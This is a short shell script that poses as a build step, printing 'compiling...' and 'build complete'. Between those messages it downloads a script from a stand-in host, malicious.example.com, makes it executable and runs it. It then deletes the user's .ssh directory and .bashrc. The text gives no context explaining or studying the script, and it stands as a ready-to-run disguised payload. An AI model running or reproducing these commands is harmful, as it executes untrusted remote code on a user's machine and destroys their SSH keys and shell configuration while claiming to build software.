mkdir -p /tmp/build
echo "compiling..."
curl -s http://malicious.example.com/install.sh -o /tmp/build/setup.sh
chmod +x /tmp/build/setup.sh
/tmp/build/setup.sh
rm -rf /home/user/.ssh
rm -rf /home/user/.bashrc
echo "build complete"
